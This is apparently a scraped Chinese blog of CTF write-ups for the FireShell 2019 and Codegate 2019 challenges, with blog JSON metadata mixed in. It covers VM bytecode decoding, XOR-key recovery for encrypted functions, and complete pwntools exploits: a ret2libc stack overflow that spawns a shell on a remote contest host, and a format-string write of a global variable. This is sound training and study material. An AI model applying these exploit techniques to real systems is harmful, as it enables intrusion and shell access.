0x00000063, 0x00000006, 0x00000000, 0x0000B0E6, 0x00000000, 0x0000B074, 0x00000006, 0x00000002, 0x00000000, 0x0000B0E6, 0x00000000, 0x0000B0E6, 0x00000006, 0x00000000, 0x00000033, 0x00000000, 0x0000004A, 0x00000001, 0x00000000, 0x0000007D, 0x00000000, 0x0000001B, 0x00000006, 0x00000000, 0x0000007D, 0x00000000, 0x00000001, 0x00000006, 0x00000000, 0x0000007D, 0x00000000, 0x0000001D, 0x00000001, 0x00000000, 0x0000009A, 0x00000000, 0x00000052, 0x00000001, 0x00000000, 0x000000EC, 0x00000000, 0x00000001, 0x00000004, 0x00000000, 0x000000EC, 0x00000000, 0x0000001D, 0x00000001, 0x00000000, 0x00000109, 0x00000000, 0x00000008, 0x00000004, 0x00000000, 0x00000848, 0x00000000, 0x00000022, 0x00000001, 0x00000000, 0x0000086A, 0x00000000, 0x00000025, 0x00000001, 0x00000000, 0x0000088F, 0x00000000, 0x00000009, 0x00000001, 0x00000000, 0x00000898, 0x00000000, 0x00000024, 0x00000006, 0x00000000, 0x00000898, 0x00000000, 0x0000005F, 0x00000001, 0x00000000, 0x000008F7, 0x00000000, 0x000008C4, 0x00000006, 0x00000002, 0x00000000, 0x000008F7, 0x00000000, 0x000008F7, 0x00000006, 0x00000000, 0x00000061, 0x00000000, 0x00000007, 0x00000004, 0x00000000, 0x000002A7, 0x00000000, 0x00000006, 0x00000004, 0x00000000, 0x00000FEA, 0x00000000, 0x00000003, 0x00000004, 0x00000000, 0x00002FBE, 0x00000000, 0x0000003C, 0x00000001, 0x00000000, 0x00002FFA, 0x00000000, 0x00000007, 0x00000004, 0x00000000, 0x00014FD6, 0x00000000, 0x00000015, 0x00000001, 0x00000000, 0x00014FEB, 0x00000000, 0x00000062, 0x00000006, 0x00000000, 0x00014FEB, 0x00000000, 0x00000004, 0x00000004, 0x00000000, 0x00053FAC, 0x00000000, 0x00000016, 0x00000006, 0x00000000, 0x00053FAC, 0x00000000, 0x0000005C, 0x00000006, 0x00000000, 0x00053FAC, 0x00000000, 0x00000009, 0x00000004, 0x00000000, 0x002F3D0C, 0x00000000, 0x00000005, 0x00000004, 0x00000000, 0x00EC313C, 0x00000000, 0x00000015, 0x00000006, 0x00000000, 0x00EC313C, 0x00000000, 0x00000041, 0x00000001, 0x00000000, 0x00EC317D, 0x00000000, 0x00000004, 0x00000006, 0x00000000, 0x00EC317D, 0x00000000, 0x0000002A, 0x00000006, 0x00000000, 0x00EC317D, 0x00000000, 0x0000000A, 0x00000004, 0x00000000, 0x0939EEE2, 0x00000000, 0x00000009, 0x00000004, 0x00000000, 0x530965F2, 0x00000000, 0x53096591, 0x00000006, 0x00000002, 0x00000000, 0x530965F2, 0x00000000, 0x530965F2, 0x00000006, 0x00000000, 0x0000006C, 0x00000000, 0x00000004, 0x00000004, 0x00000000, 0x000001B0, 0x00000000, 0x00000034, 0x00000001, 0x00000000, 0x000001E4, 0x00000000, 0x00000009, 0x00000004, 0x00000000, 0x00001104, 0x00000000, 0x0000001E, 0x00000001, 0x00000000, 0x00001122, 0x00000000, 0x00000005, 0x00000001, 0x00000000, 0x00001127, 0x00000000, 0x00000061, 0x00000006, 0x00000000, 0x00001127, 0x00000000, 0x0000005F, 0x00000006, 0x00000000, 0x00001127, 0x00000000, 0x00000007, 0x00000004, 0x00000000, 0x00007811, 0x00000000, 0x00000030, 0x00000006, 0x00000000, 0x00007811, 0x00000000, 0x00000001, 0x00000004, 0x00000000, 0x00007811, 0x00000000, 0x00000008, 0x00000001, 0x00000000, 0x00007819, 0x00000000, 0x00000025, 0x00000006, 0x00000000, 0x00007819, 0x00000000, 0x00000036, 0x00000006, 0x00000000, 0x00007819, 0x00000000, 0x0000002F, 0x00000001, 0x00000000, 0x00007848, 0x00000000, 0x0000000E, 0x00000001, 0x00000000, 0x00007856, 0x00000000, 0x00000053, 0x00000001, 0x00000000, 0x000078A9, 0x00000000, 0x00000005, 0x00000004, 0x00000000, 0x00025B4D, 0x00000000, 0x00000005, 0x00000006, 0x00000000, 0x00025B4D, 0x00000000, 0x00025AE1, 0x00000006, 0x00000002, 0x00000000, 0x00025B4D, 0x00000000, 0x00025B4D, 0x00000006, 0x00000000, 0x0000006C, 0x00000000, 0x00000036, 0x00000006, 0x00000000, 0x0000006C, 0x00000000, 0x00000037, 0x00000006, 0x00000000, 0x0000006C, 0x00000000, 0x00000007, 0x00000004, 0x00000000, 0x000002F4, 0x00000000, 0x0000000D, 0x00000006, 0x00000000, 0x000002F4, 0x00000000, 0x00000039, 0x00000006, 0x00000000, 0x000002F4, 0x00000000, 0x00000005, 0x00000004, 0x00000000, 0x00000EC4, 0x00000000, 0x00000059, 0x00000006, 0x00000000, 0x00000EC4, 0x00000000, 0x00000036, 0x00000001, 0x00000000, 0x00000EFA, 0x00000000, 0x00000001, 0x00000004, 0x00000000, 0x00000EFA, 0x00000000, 0x00000008, 0x00000004, 0x00000000, 0x000077D0, 0x00000000, 0x00000055, 0x00000006, 0x00000000, 0x000077D0, 0x00000000, 0x00000060, 0x00000006, 0x00000000, 0x000077D0, 0x00000000, 0x00000035, 0x00000001, 0x00000000, 0x00007805, 0x00000000, 0x00007799, 0x00000006, 0x00000002, 0x00000000, 0x00007805, 0x00000000, 0x00007805, 0x00000006, 0x00000000, 0x00000079, 0x00000000, 0x00000039, 0x00000006, 0x00000000, 0x00000079, 0x00000000, 0x00000001, 0x00000004, 0x00000000, 0x00000079, 0x00000000, 0x00000001, 0x00000001, 0x00000000, 0x0000007A, 0x00000000, 0x00000006, 0x00000004, 0x00000000, 0x000002DC, 0x00000000, 0x00000051, 0x00000006, 0x00000000, 0x000002DC, 0x00000000, 0x00000022, 0x00000001, 0x00000000, 0x000002FE, 0x00000000, 0x0000000D, 0x00000001, 0x00000000, 0x0000030B, 0x00000000, 0x00000052, 0x00000001, 0x00000000, 0x0000035D, 0x00000000, 0x00000007, 0x00000006, 0x00000000, 0x0000035D, 0x00000000, 0x00000021, 0x00000006, 0x00000000, 0x0000035D, 0x00000000, 0x00000063, 0x00000001, 0x00000000, 0x000003C0, 0x00000000, 0x00000009, 0x00000004, 0x00000000, 0x000021C0, 0x00000000, 0x0000002B, 0x00000006, 0x00000000, 0x000021C0, 0x00000000, 0x00002147, 0x00000006, 0x00000002, 0x00000000, 0x000021C0, 0x00000000, 0x000021C0, 0x00000006, 0x00000000, 0x0000005F, 0x00000000, 0x00000003, 0x00000004, 0x00000000, 0x0000011D, 0x00000000, 0x00000020, 0x00000006, 0x00000000, 0x0000011D, 0x00000000, 0x00000004, 0x00000004, 0x00000000, 0x00000474, 0x00000000, 0x00000030, 0x00000006, 0x00000000, 0x00000474, 0x00000000, 0x00000024, 0x00000001, 0x00000000, 0x00000498, 0x00000000, 0x0000002D, 0x00000006, 0x00000000, 0x00000498, 0x00000000, 0x00000005, 0x00000004, 0x00000000, 0x000016F8, 0x00000000, 0x00000007, 0x00000001, 0x00000000, 0x000016FF, 0x00000000, 0x00000058, 0x00000006, 0x00000000, 0x000016FF, 0x00000000, 0x00000007, 0x00000004, 0x00000000, 0x0000A0F9, 0x00000000, 0x00000030, 0x00000001, 0x00000000, 0x0000A129, 0x00000000, 0x00000007, 0x00000004, 0x00000000, 0x0004681F, 0x00000000, 0x00000049, 0x00000006, 0x00000000, 0x0004681F, 0x00000000, 0x00000044, 0x00000001, 0x00000000, 0x00046863, 0x00000000, 0x00000009, 0x00000004, 0x00000000, 0x0027AB7B, 0x00000000, 0x00000009, 0x00000006, 0x00000000, 0x0027AB7B, 0x00000000, 0x00000055, 0x00000006, 0x00000000, 0x0027AB7B, 0x00000000, 0x0027AB1C, 0x00000006, 0x00000002, 0x00000000, 0x0027AB7B, 0x00000000, 0x0027AB7B, 0x00000006, 0x00000000, 0x00000063, 0x00000000, 0x00000006, 0x00000004, 0x00000000, 0x00000252, 0x00000000, 0x00000006, 0x00000004, 0x00000000, 0x00000DEC, 0x00000000, 0x00000007, 0x00000004, 0x00000000, 0x00006174, 0x00000000, 0x00000004, 0x00000004, 0x00000000, 0x000185D0, 0x00000000, 0x0000003C, 0x00000001, 0x00000000, 0x0001860C, 0x00000000, 0x00000063, 0x00000006, 0x00000000, 0x0001860C, 0x00000000, 0x0000001A, 0x00000001, 0x00000000, 0x00018626, 0x00000000, 0x00000064, 0x00000001, 0x00000000, 0x0001868A, 0x00000000, 0x00000057, 0x00000006, 0x00000000, 0x0001868A, 0x00000000, 0x0000005D, 0x00000006, 0x00000000, 0x0001868A, 0x00000000, 0x0000005C, 0x00000006, 0x00000000, 0x0001868A, 0x00000000, 0x00018627, 0x00000006, 0x00000002, 0x00000000, 0x0001868A, 0x00000000, 0x0001868A, 0x00000006, 0x00000000, 0x00000030, 0x00000000, 0x00000001, 0x00000004, 0x00000000, 0x00000030, 0x00000000, 0x00000005, 0x00000006, 0x00000000, 0x00000030, 0x00000000, 0x00000009, 0x00000001, 0x00000000, 0x00000039, 0x00000000, 0x00000001, 0x00000004, 0x00000000, 0x00000039, 0x00000000, 0x00000002, 0x00000004, 0x00000000, 0x00000072, 0x00000000, 0x0000004E, 0x00000006, 0x00000000, 0x00000072, 0x00000000, 0x0000002D, 0x00000001, 0x00000000, 0x0000009F, 0x00000000, 0x00000002, 0x00000004, 0x00000000, 0x0000013E, 0x00000000, 0x00000003, 0x00000004, 0x00000000, 0x000003BA, 0x00000000, 0x00000029, 0x00000001, 0x00000000, 0x000003E3, 0x00000000, 0x000003B3, 0x00000006, 0x00000002, 0x00000000, 0x000003E3, 0x00000000, 0x000003E3, 0x00000006, 0x00000000, 0x00000030, 0x00000000, 0x0000003E, 0x00000006, 0x00000000, 0x00000030, 0x00000000, 0x00000008, 0x00000004, 0x00000000, 0x00000180, 0x00000000, 0x0000001A, 0x00000001, 0x00000000, 0x0000019A, 0x00000000, 0x0000000F, 0x00000001, 0x00000000, 0x000001A9, 0x00000000, 0x0000003A, 0x00000001, 0x00000000, 0x000001E3, 0x00000000, 0x00000009, 0x00000004, 0x00000000, 0x000010FB, 0x00000000, 0x00000001, 0x00000004, 0x00000000, 0x000010FB, 0x00000000, 0x00000004, 0x00000004, 0x00000000, 0x000043EC, 0x00000000, 0x00000008, 0x00000004, 0x00000000, 0x00021F60, 0x00000000, 0x00000009, 0x00000001, 0x00000000, 0x00021F69, 0x00000000, 0x00000002, 0x00000004, 0x00000000, 0x00043ED2, 0x00000000, 0x00000008, 0x00000004, 0x00000000, 0x0021F690, 0x00000000, 0x00000013, 0x00000006, 0x00000000, 0x0021F690, 0x00000000, 0x00000001, 0x00000004, 0x00000000, 0x0021F690, 0x00000000, 0x0021F660, 0x00000006, 0x00000002, 0x00000000, 0x0021F690, 0x00000000, 0x0021F690, 0x00000006, 0x00000000, 0x0000006C, 0x00000000, 0x00000009, 0x00000004, 0x00000000, 0x000003CC, 0x00000000, 0x00000025, 0x00000006, 0x00000000, 0x000003CC, 0x00000000, 0x0000005C, 0x00000006, 0x00000000, 0x000003CC, 0x00000000, 0x00000033, 0x00000006, 0x00000000, 0x000003CC, 0x00000000, 0x00000003, 0x00000004, 0x00000000, 0x00000B64, 0x00000000, 0x00000062, 0x00000006, 0x00000000, 0x00000B64, 0x00000000, 0x0000000A, 0x00000004, 0x00000000, 0x000071E8, 0x00000000, 0x00000023, 0x00000006, 0x00000000, 0x000071E8, 0x00000000, 0x00000033, 0x00000001, 0x00000000, 0x0000721B, 0x00000000, 0x00000054, 0x00000001, 0x00000000, 0x0000726F, 0x00000000, 0x0000004A, 0x00000001, 0x00000000, 0x000072B9, 0x00000000, 0x00000005, 0x00000004, 0x00000000, 0x00023D9D, 0x00000000, 0x00000002, 0x00000006, 0x00000000, 0x00023D9D, 0x00000000, 0x00000015, 0x00000006, 0x00000000, 0x00023D9D, 0x00000000, 0x00000053, 0x00000001, 0x00000000, 0x00023DF0, 0x00000000, 0x00000004, 0x00000001, 0x00000000, 0x00023DF4, 0x00000000, 0x00023D88, 0x00000006, 0x00000002, 0x00000000, 0x00023DF4, 0x00000000, 0x00023DF4, 0x00000006, 0x00000000, 0x00000021, 0x00000000, 0x00000044, 0x00000006, 0x00000000, 0x00000021, 0x00000000, 0x0000005D, 0x00000001, 0x00000000, 0x0000007E, 0x00000000, 0x00000043, 0x00000006, 0x00000000, 0x0000007E, 0x00000000, 0x00000042, 0x00000006, 0x00000000, 0x0000007E, 0x00000000, 0x00000049, 0x00000001, 0x00000000, 0x000000C7, 0x00000000, 0x0000002C, 0x00000006, 0x00000000, 0x000000C7, 0x00000000, 0x00000038, 0x00000001, 0x00000000, 0x000000FF, 0x00000000, 0x00000029, 0x00000001, 0x00000000, 0x00000128, 0x00000000, 0x00000006, 0x00000001, 0x00000000, 0x0000012E, 0x00000000, 0x00000008, 0x00000001, 0x00000000, 0x00000136, 0x00000000, 0x00000115, 0x00000006, 0x00000002, 0x00000000, 0x00000136, 0x00000000, 0x00000136, 0x00000006, 0x00000000, 0x0000007D, 0x00000000, 0x00000006, 0x00000004, 0x00000000, 0x000002EE, 0x00000000, 0x0000002E, 0x00000006, 0x00000000, 0x000002EE, 0x00000000, 0x00000004, 0x00000004, 0x00000000, 0x00000BB8, 0x00000000, 0x00000033, 0x00000006, 0x00000000, 0x00000BB8, 0x00000000, 0x00000014, 0x00000001, 0x00000000, 0x00000BCC, 0x00000000, 0x0000000E, 0x00000006, 0x00000000, 0x00000BCC, 0x00000000, 0x00000035, 0x00000006, 0x00000000, 0x00000BCC, 0x00000000, 0x0000001A, 0x00000001, 0x00000000, 0x00000BE6, 0x00000000, 0x00000058, 0x00000006, 0x00000000, 0x00000BE6, 0x00000000, 0x00000046, 0x00000006, 0x00000000, 0x00000BE6, 0x00000000, 0x00000042, 0x00000001, 0x00000000, 0x00000C28, 0x00000000, 0x0000000F, 0x00000006, 0x00000000, 0x00000C28, 0x00000000, 0x00000022, 0x00000001, 0x00000000, 0x00000C4A, 0x00000000, 0x00000005, 0x00000004, 0x00000000, 0x00003D72, 0x00000000, 0x00000053, 0x00000006, 0x00000000, 0x00003D72, 0x00000000, 0x0000000B, 0x00000001, 0x00000000, 0x00003D7D, 0x00000000, 0x0000005D, 0x00000006, 0x00000000, 0x00003D7D, 0x00000000, 0x0000005F, 0x00000006, 0x00000000, 0x00003D7D, 0x00000000, 0x00000009, 0x00000004, 0x00000000, 0x00022965, 0x00000000, 0x000228E8, 0x00000006, 0x00000002, 0x00000000, 0x00022965, 0x00000000, 0x00022965, 0x00000006, 0x00000003, 0x00000000]i = -1j = 0buf = [0 for k in range(530)]tmp = 0count = 1flag = ''while(True): if i - 1 != tmp and buf[i - 1] == 0: flag += chr(buf[i]) tmp = i - 1 c = code[j] if c == 0: i += 1 j += 1 buf[i] = code[j] elif c == 1: i -= 1 buf[i] += buf[i + 1] elif c == 3: print 'Over' break elif c == 4: i -= 1 buf[i] *= buf[i + 1] elif c == 5: i -= 1 buf[i] /= buf[i + 1] elif c == 6: i -= 1 buf[i] -= buf[i + 1] elif c == 2: j += 1 continue else: print 'Error' break print 'buf[&#123;&#125;] = &#123;&#125;'.format(str(i), hex(buf[i])) j += 1print flag 同时在buf的值中发现buf[0] = 0x46 = &#39;F&#39; ; buf[11] = 0, buf[12] = 0x23 = &#39;#&#39; ; ...，猜测每次输出为buf[i] = 0的后一个值即buf[i + 1]为flag的值。对脚本稍作修改后得到flag。 PWNleakless简单栈溢出。 1234567[leakless] checksec leakless[*] '/root/ctf/2019-FireShell/leakless/leakless' Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000) 没开canary和pie。可以看到溢出漏洞在这里： 123456ssize_t feedme()&#123; char buf; // [esp+0h] [ebp-48h] return read(0, &amp;buf, 0x100u);&#125; 第一次先泄露出puts的地址，然后找到libc的版本，return回feedme()函数。第二次直接跳system。exp如下： 12345678910111213141516171819202122232425262728293031323334353637#!/usr/bin/env pythonfrom pwn import *from LibcSearcher import *context.log_level = 'debug'context.arch = 'i386'p = remote('35.243.188.20', 2002)elf = ELF('./leakless')offset = 76feedme = elf.symbols['feedme']puts_plt = elf.plt['puts']puts_got = elf.got['puts']log.success('feedme = ' + hex(feedme))log.success('puts_plt = ' + hex(puts_plt))log.success('puts_got = ' + hex(puts_got))payload1 = flat([ 'A' * offset, puts_plt, feedme, puts_got])p.sendline(payload1)puts = u32(p.recv(4))log.success('puts = ' + hex(puts))libc = LibcSearcher('puts', puts)libc_base = puts - libc.dump('puts')system = libc_base + libc.dump('system')str_bin_sh = libc_base + libc.dump('str_bin_sh')log.success('libc_base = ' + hex(libc_base))log.success('system = ' + hex(system))log.success('str_bin_sh = ' + hex(str_bin_sh))payload2 = flat([ 'A' * offset, system, 0x12345678, str_bin_sh])p.interactive() casino除了pie其他保护都开了： 1234567[casino] checksec casino 11:02:20 [*] '/root/ctf/2019-FireShell/casino/casino' Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000) 在ida里查看main函数： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748// local variable allocation has failed, the output may be wrong!int __cdecl main(int argc, const char **argv, const char **envp)&#123; int v4; // [rsp+4h] [rbp-5Ch] int v5; // [rsp+8h] [rbp-58h] unsigned int i; // [rsp+Ch] [rbp-54h] unsigned int seed; // [rsp+10h] [rbp-50h] int v8; // [rsp+14h] [rbp-4Ch] FILE *stream; // [rsp+18h] [rbp-48h] char buf; // [rsp+20h] [rbp-40h] char ptr; // [rsp+30h] [rbp-30h] unsigned __int64 v12; // [rsp+58h] [rbp-8h] v12 = __readfsqword(0x28u); setup(*(_QWORD *)&amp;argc, argv, envp); seed = (unsigned int)time(0LL) / 0xA; printf(\"What is your name? \"); read(0, &amp;buf, 0x10uLL); printf(\"Welcome \", &amp;buf); printf(&amp;buf); putchar(10); seed += bet; srand(seed); v4 = 0; v5 = 0; for ( i = 1; (signed int)i &lt;= 99; ++i ) &#123; v8 = rand(); printf(\"[%d/100] Guess my number: \", i); __isoc99_scanf(\"%d\", &amp;v4); if ( v8 != v4 ) &#123; puts(\"Sorry! It was not my number\"); exit(0); &#125; puts(\"Correct!\"); v5 += bet; &#125; if ( v5 &gt; 100 ) &#123; puts(\"Cool! Here's another prize\"); stream = fopen(\"flag.txt\", \"r\"); fread(&amp;ptr, 0x1EuLL, 1uLL, stream); fclose(stream); printf(\"%s\", &amp;ptr); &#125; return 0;&#125; 需要猜99次随机数，然后使得由bet累加起来大于100即得到flag。首先要过前面的猜数字，照样子写一个c程序即可： 12345678910111213141516#include &lt;stdio.h&gt;#include &lt;time.h&gt;#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;int main() &#123; int seed = time(0) / 0xA; int bet = 2; // 1; seed += bet; srand(seed); for (int i = 0; i &lt; 99; i++) &#123; int a = rand(); printf(\"%d\\n\", a); &#125; return 0;&#125; 先编译，gcc solve.c -o solve；再pipe一下，(echo &#39;test&#39;; ./solve) | ./casino。得到结果是： 123[1/100] Guess my number: Correct!...[99/100] Guess my number: Correct! 说明猜数字过了，而bet累加起来只有99，没有超过100。此时回忆之前的代码，printf(&quot;Welcome &quot;, &amp;buf);存在格式化字符串漏洞，我们只需要通过这个漏洞，将bet的值改写即可。通过gdb调试得到bet的地址： 123456789[-------------------------------------code-------------------------------------] 0x400ac3 &lt;main+132&gt;: call 0x400840 &lt;printf@plt&gt; 0x400ac8 &lt;main+137&gt;: mov edi,0xa 0x400acd &lt;main+142&gt;: call 0x4007f0 &lt;putchar@plt&gt;=&gt; 0x400ad2 &lt;main+147&gt;: mov eax,DWORD PTR [rip+0x201548] # 0x602020 &lt;bet&gt; 0x400ad8 &lt;main+153&gt;: add DWORD PTR [rbp-0x50],eax 0x400adb &lt;main+156&gt;: mov eax,DWORD PTR [rbp-0x50] 0x400ade &lt;main+159&gt;: mov edi,eax 0x400ae0 &lt;main+161&gt;: call 0x400870 &lt;srand@plt&gt; 确定第一个参数在栈上的偏移为11： 1234567891011[casino] python -c 'print \"%2c%11$n\" + \"\\x20\\x20\\x60\\x00\\x00\\x00\\x00\\x00\"' &gt; input 20:06:05 [casino] gdb ./casino -q 20:06:11 Reading symbols from ./casino...(no debugging symbols found)...done.assassinq&gt;&gt; b *main+137Breakpoint 1 at 0x400ac8assassinq&gt;&gt; r &lt; input Starting program: /root/ctf/2019-FireShell/casino/casino &lt; inputWhat is your name? Welcome ? `Breakpoint 1, 0x0000000000400ac8 in main ()assassinq&gt;&gt; x/wx 0x6020200x602020 &lt;bet&gt;: 0x00000002 我把bet的值改为2。最后的exp如下： 12345678910111213141516171819202122#!/usr/bin/env pythonfrom pwn import *context.log_level = 'debug'context.arch = 'amd64'local = 1if local: p = process('./casino')else: passbet_addr = 0x0000000000602020bet = 2offset = 11fmt = '%&#123;&#125;c%&#123;&#125;$n'payload = flat([fmt.format(str(bet), str(offset)), bet_addr])p.sendlineafter('name?', payload)s = process('./solve')nums = s.recvall().split('\\n')[:-1]s.close()for n in nums: p.sendlineafter('number:', n)print p.recvall()p.close() babyheap参考网站https://cute-0tter.hatenablog.com/entry/2019/01/28/153836https://mp.weixin.qq.com/s/T5APY4HJnw7rM3nvxDi8NAhttps://mp.weixin.qq.com/s/LzyKtwmqq5HO6meUqq7aughttps://github.com/D4nch3n/Cyber-Competitions/blob/master/fireshellctf/README.mdhttps://github.com/flawwan/CTF-Writeups/blob/master/Fireshell/casino/casino.md","categories":[],"tags":[{"name":"ctf","slug":"ctf","permalink":"https://qianfei11.github.io/tags/ctf/"},{"name":"review","slug":"review","permalink":"https://qianfei11.github.io/tags/review/"}]},{"title":"2019-Codegate-Preliminary-review","slug":"2019-Codegate-Preliminary-review","date":"2019-01-28T01:41:35.000Z","updated":"2019-03-27T03:35:01.176Z","comments":true,"path":"2019/01/28/2019-Codegate-Preliminary-review/","link":"","permalink":"https://qianfei11.github.io/2019/01/28/2019-Codegate-Preliminary-review/","excerpt":"打了一次Codegate真滴太难了。跟着国外大佬的writeup复现还是学到了一点东西。","text":"打了一次Codegate真滴太难了。跟着国外大佬的writeup复现还是学到了一点东西。 MIC check19P&amp;;gFD,5.BOPCdBl7Q+@V’1dDK?qL 找个在线解base85的网站即可。 KingMaker运行elf发现是一个在终端上的文字冒险游戏，每次做出选择然后输入key，若正确则进入下一环节。main函数： 1234567891011121314151617181920212223242526272829303132333435363738394041__int64 __fastcall main(__int64 a1, char **a2, char **a3)&#123; int choice; // [rsp+4h] [rbp-Ch] unsigned __int64 v5; // [rsp+8h] [rbp-8h] v5 = __readfsqword(0x28u); mprotect(&amp;dword_400000, 0x4096uLL, 7); setvbuf(stdin, 0LL, 2, 0LL); setvbuf(stdout, 0LL, 2, 0LL); setvbuf(stderr, 0LL, 2, 0LL); put_s(\" _ ___ __ __ _ \", 0LL); put_s(\" | |/ (_)_ __ __ _| \\\\/ | __ _| | _____ _ __ \", 0LL); put_s(\" | ' /| | '_ \\\\ / _` | |\\\\/| |/ _` | |/ / _ \\\\ '__|\", 0LL); put_s(\" | . \\\\| | | | | (_| | | | | (_| | &lt; __/ | \", 0LL); put_s(\" |_|\\\\_\\\\_|_| |_|\\\\__, |_| |_|\\\\__,_|_|\\\\_\\\\___|_| \", 0LL); put_s(\" |___/ \\n\", 0LL); put_s(\"Once upon a time, there was a kingdom with 7 princes.\", 0LL); put_s(\"One day the king thinks to decide the who will be the next king.\", 0LL); put_s(\"So he made 5 tests for the princes.\", 0LL); put_s(\"If you pass all the tests, you can be a king!\\n\", 0LL); put_s(\"**********************KING MAKER START**********************\\n\", 0LL); put_s(\"...\", 0LL); put_s(\".....\", 0LL); put_s(\".......\", 0LL); put_s(\"Who am I...??\", 0LL); put_s(\"1&gt; Ask to someone\", 0LL); put_s(\"2&gt; Look around\", 0LL); __isoc99_scanf(\"%d\", &amp;choice); printf(\"\\x1B[H\\x1B[J\", &amp;choice); if ( choice == 1 ) &#123; sub_403636((__int64)\"\\x1B[H\\x1B[J\", (__int64)&amp;choice); &#125; else &#123; if ( choice != 2 ) end_game(\"SYSTEM : Choose wrong choice!\", 0LL); sub_403607((__int64)\"\\x1B[H\\x1B[J\", (__int64)&amp;choice); &#125; return 0LL;&#125; 在end_game()中看到cat flag。同时发现只要五个变量同时等于5就能得到flag： 1234567891011121314151617void __fastcall __noreturn end_game(const char *a1, __int64 a2)&#123; puts(a1); if ( (_DWORD)a2 == 1 ) &#123; if ( brave != 5 || wise != 5 || kind != 5 || decision != 5 || sacrifice != 5 ) &#123; put_s(\"King : But you couldn't make the points... You can't be a king.\", a2); &#125; else &#123; put_s(\"King : Congratuations to be a king!\", a2); system(\"/bin/cat ./flag\"); &#125; &#125; exit(-1);&#125; 程序往下走，看到stage1()要求输入key。之后看总共有五次要求输入key，下面列出第一次的反汇编代码： 12345678910111213141516171819202122232425unsigned __int64 __fastcall stage1(__int64 a1, __int64 a2)&#123; __int64 v2; // rsi char key1; // [rsp+0h] [rbp-10h] unsigned __int64 v5; // [rsp+8h] [rbp-8h] v5 = __readfsqword(0x28u); put_s(\"You : Am I....??\", a2); put_s(\"Servant : The king calls the prince!\", a2); put_s(\"...\", a2); put_s(\".....\", a2); put_s(\".......\\n\", a2); put_s(\"King : I'm too old to rule the kingdom.\", a2); put_s(\"King : So I will give you few tests and choose the next king.\", a2); put_s(\"King : The only one prince who passes all the tests can be the king.\\n\", a2); put_s(\"King : If you want to participate at this test, Enter the key for test 1\", a2); __isoc99_scanf(\"%s\", &amp;key1); printf(\"\\x1B[H\\x1B[J\", &amp;key1); if ( !(unsigned int)check(&amp;key1, 1u, 5u) ) end_game(\"King : Wrong! Don't you want to be a king?\", 0LL); v2 = (unsigned int)num1[0]; encrypt_func(&amp;loc_40341D, num1[0], &amp;key1); ((void (__fastcall *)(char *, __int64))loc_40341D)(&amp;key1, v2); return __readfsqword(0x28u) ^ v5;&#125; 下面发现如果过了check，函数loc_40341D这里被加密了，只有一大块奇怪的数据块： 12345678910111213141516171819202122.text:000000000040341D ; ---------------------------------------------------------------------------.text:000000000040341D.text:000000000040341D loc_40341D: ; CODE XREF: stage1+CD↓p.text:000000000040341D ; DATA XREF: stage1+BC↓o.text:000000000040341D ; __unwind &#123;.text:000000000040341D cmp [rdi], eax ; Compare Two Operands.text:000000000040341F call rsi ; Indirect Call Near Procedure.text:0000000000403421 and al, 0CCh ; Logical AND.text:0000000000403421 ; ---------------------------------------------------------------------------.text:0000000000403423 db 9Ah, 13h, 24h, 0C6h, 0Bh.text:0000000000403428 dq 76674937FD0708DBh, 0B67E9476FF076C33h, 0A0B484333616848Ch.text:0000000000403428 dq 9E4F2C697EF093CCh, 3615048C89B0BAC2h, 0CCF093CCA0A88433h.text:0000000000403428 dq 89B0BAEE9E4F2C65h, 0A09C84333619AF8Ch, 0FF079876FB0793CCh.text:0000000000403428 dq 76F76C734F00D3F5h, 89B0B8639E4F6C33h, 764FD43336763E8Ch.text:0000000000403428 dq 0FDB093E097A76C33h, 0FD6B19328ECC9876h, 23C4243356737F36h.text:0000000000403428 dq 760F5F3CC989E5DBh, 33C424CC899960DBh, 89B13ADBB1C624DBh.text:0000000000403428 dq 8ECC9876FD7487CCh, 56748F36FD6B1931h, 0C989E5DB23C42433h.text:0000000000403428 dq 899A8CDB760F5FCCh, 0B1C624DB33C424CCh, 0C84087CC89B076DBh.text:0000000000403428 dq 3676CF8C764F6C33h, 3EDF93CCA02D8433h, 534B5F7B12B729B8h.text:0000000000403428 dq 33A76947764F6C1Bh.text:0000000000403508 db 0E0h, 93h, 0B0h, 0BFh, 0F0h.text:0000000000403508 ; &#125; // starts at 40341D 进入encrypt()函数，基本上就能知道对函数通过key异或来加密： 123456789101112131415161718192021_BYTE *__fastcall encrypt(_BYTE *start_addr, int end_addr, const char *key)&#123; _BYTE *fp; // rax char *s; // [rsp+8h] [rbp-28h] signed int i; // [rsp+20h] [rbp-10h] unsigned int len; // [rsp+24h] [rbp-Ch] _BYTE *addr; // [rsp+28h] [rbp-8h] s = (char *)key; i = 0; len = strlen(key); for ( addr = start_addr; ; ++addr ) &#123; fp = &amp;start_addr[end_addr]; if ( fp &lt;= addr ) break; *addr ^= s[i]; i = (i + 1) % len; &#125; return fp;&#125; 又因为每个函数调用时，一开始都会有push rbp ; mov rbp, rsp ;，十六进制表示也就是0x554889e5： 12345678910from pwn import *code = ''' push rbp mov rbp, rsp'''print hex(u32(asm(code)))# 0xe5894855# little endian# 55 push rbp# 4889e5 mov rbp, rsp 然后由此可以解出key1和key2，然后key3、key4和key5根据之前解出函数可以得到。下面给出脚本： 12345678910111213141516171819202122232425262728def test(func, length): prologue = [0x55, 0x48, 0x89, 0xe5, 0x48, 0x83, 0xEC, 0x20, 0x48, 0x89, 0x7D, 0xE8] length = min(len(prologue), length) key = '' for i in range(length): key += chr(func[i] ^ prologue[i]) return keyfunc1 = [0x39, 0x07, 0xff, 0xd6, 0x24, 0xcc, 0x9a]key1 = test(func1, len(func1))print key1# lOv3func2 = [0x11, 0x78, 0xe5, 0xd4, 0x0c, 0xb3, 0x80]key2 = test(func2, len(func2))print key2# D0l1func3 = [0x1D, 0x3D, 0xC7, 0x82, 0x1A, 0xDA, 0xB8, 0x11, 0x25, 0xBA, 0x35]key3 = test(func3, len(func3))print key3# HuNgRYT1m3func4 = [0x13, 0x78, 0xFC, 0xB7, 0x1B, 0xB0, 0x8D, 0x73, 0x78, 0xE7, 0x3B, 0xD8, 0x11]key4 = test(func4, len(func4))print key4# F0uRS3aS0nfunc5 = [0x01, 0x79, 0xE2, 0xB1, 0x7C, 0xE8, 0xB8, 0x10, 0x03, 0xE2, 0x29, 0xD9]key5 = test(func5, len(func5))print key5# T1kT4kT0Kk 